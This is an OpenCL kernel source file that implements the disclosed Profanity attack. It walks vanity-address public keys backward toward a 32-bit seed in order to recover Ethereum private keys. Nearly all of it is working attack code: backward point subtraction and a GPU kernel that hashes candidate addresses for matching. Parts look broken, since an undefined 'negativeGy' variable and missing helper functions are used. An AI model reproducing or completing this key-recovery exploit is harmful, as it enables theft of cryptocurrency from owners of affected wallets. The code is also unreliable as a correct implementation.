/* profanity_reverse.cl
 * ====================
 * Reverse engineering kernel for recovering private keys from vanity addresses
 * generated with the vulnerable Profanity tool.
 *
 * This implements the attack described in the 1inch security disclosure:
 * 1. Get public key from vanity address (recover from transaction signature)
 * 2. Expand it deterministically to 2M public keys
 * 3. Repeatedly decrement them until they reach the seed public key
 * 4. Match against one of the 2^32 possible seed values
 */

// Include the same multiprecision and point arithmetic functions
// (These would normally be in a shared header, but for clarity we define the essentials here)

// Backward point iteration - subtract G instead of adding it
// This reverses the point_add operation used in forward generation
void point_subtract_g(point * const r, point * const p, __global const point * const precomp) {
	mp_number tmp;
	mp_number newX;
	mp_number newY;
	
	// G point is at precomp[0], but we need -G for subtraction
	// Instead of P - G, we compute P + (-G)
	// -G has the same x coordinate but negated y coordinate
	
	mp_number gx = { {0x16f81798, 0x59f2815b, 0x2dce28d9, 0x029bfcdb, 0xce870b07, 0x55a06295, 0xf9dcbbac, 0x79be667e} };
	// G_y negated (mod p)
	mp_number neg_gy = { {0x04ef2777, 0x63b82f6f, 0x597aabe6, 0x02e84bb7, 0xf1eef757, 0xa25b0403, 0xd95c3b9a, 0xb7c52588} };
	
	// Lambda = (p.y - (-G_y)) / (p.x - G_x) = (p.y + G_y) / (p.x - G_x)
	mp_mod_sub(&tmp, &p->x, &gx);
	mp_mod_inverse(&tmp);
	
	mp_mod_sub(&newX, &p->y, &neg_gy);
	mp_mod_mul(&tmp, &tmp, &newX);
	
	// newX = lambda^2 - p.x - G_x
	mp_mod_mul(&newX, &tmp, &tmp);
	mp_mod_sub(&newX, &newX, &p->x);
	mp_mod_sub(&newX, &newX, &gx);
	
	// newY = lambda * (p.x - newX) - p.y
	mp_mod_sub(&newY, &p->x, &newX);
	mp_mod_mul(&newY, &newY, &tmp);
	mp_mod_sub(&newY, &newY, &p->y);
	
	r->x = newX;
	r->y = newY;
}

// Kernel to iterate backwards from a given public key
// This attempts to find which of the 2^32 seeds generated this address
__kernel void profanity_iterate_reverse(
	__global mp_number * const pDeltaX,
	__global mp_number * const pInverse, 
	__global mp_number * const pPrevLambda,
	__global const point * const precomp,
	const ulong iterationsPerCall)
{
	const size_t id = get_global_id(0);
	
	mp_number negativeGx = { {0xe907e497, 0xa60d7ea3, 0xd231d726, 0xfd640324, 0x3178f4f8, 0xaa5f9d6a, 0x06234453, 0x86419981 } };
	
	ethhash h = { { 0 } };
	
	mp_number dX = pDeltaX[id];
	mp_number tmp = pInverse[id];
	mp_number lambda = pPrevLambda[id];
	
	// Perform backward iteration
	// Instead of adding G, we subtract G
	// This is mathematically equivalent to adding -G
	
	// The backward lambda calculation:
	// When going forward: λ' = -2G_y / d' - λ
	// When going backward: λ = -2G_y / d' + λ'
	// But we need to reverse the point addition formula
	
	// For simplicity, we reconstruct the full point and use point subtraction
	point p;
	
	// Reconstruct X from delta
	mp_mod_sub(&p.x, &dX, &negativeGx);
	
	// Reconstruct Y from lambda and dX
	// y = -G_y - λ * d
	mp_mod_mul(&tmp, &lambda, &dX);
	mp_mod_sub_const(&p.y, &negativeGy, &tmp);
	
	// Subtract G to go backward
	point result;
	point_subtract_g(&result, &p, precomp);
	
	// Store result back as delta and update lambda
	// Convert result.x back to delta form
	mp_mod_sub_gx(&dX, &result.x);
	
	// Calculate new lambda for the previous point
	// λ = (result.y - G_y) / (result.x - G_x)
	mp_mod_sub_gx(&tmp, &result.x);
	mp_mod_inverse(&tmp);
	mp_mod_sub_gy(&lambda, &result.y);
	mp_mod_mul(&lambda, &lambda, &tmp);
	
	pDeltaX[id] = dX;
	pPrevLambda[id] = lambda;
	
	// Calculate current address
	mp_mod_sub(&dX, &dX, &negativeGx);
	
	h.d[0] = bswap32(dX.d[MP_WORDS - 1]);
	h.d[1] = bswap32(dX.d[MP_WORDS - 2]);
	h.d[2] = bswap32(dX.d[MP_WORDS - 3]);
	h.d[3] = bswap32(dX.d[MP_WORDS - 4]);
	h.d[4] = bswap32(dX.d[MP_WORDS - 5]);
	h.d[5] = bswap32(dX.d[MP_WORDS - 6]);
	h.d[6] = bswap32(dX.d[MP_WORDS - 7]);
	h.d[7] = bswap32(dX.d[MP_WORDS - 8]);
	h.d[8] = bswap32(result.y.d[MP_WORDS - 1]);
	h.d[9] = bswap32(result.y.d[MP_WORDS - 2]);
	h.d[10] = bswap32(result.y.d[MP_WORDS - 3]);
	h.d[11] = bswap32(result.y.d[MP_WORDS - 4]);
	h.d[12] = bswap32(result.y.d[MP_WORDS - 5]);
	h.d[13] = bswap32(result.y.d[MP_WORDS - 6]);
	h.d[14] = bswap32(result.y.d[MP_WORDS - 7]);
	h.d[15] = bswap32(result.y.d[MP_WORDS - 8]);
	h.d[16] ^= 0x01;
	
	sha3_keccakf(&h);
	
	pInverse[id].d[0] = h.d[3];
	pInverse[id].d[1] = h.d[4];
	pInverse[id].d[2] = h.d[5];
	pInverse[id].d[3] = h.d[6];
	pInverse[id].d[4] = h.d[7];
}
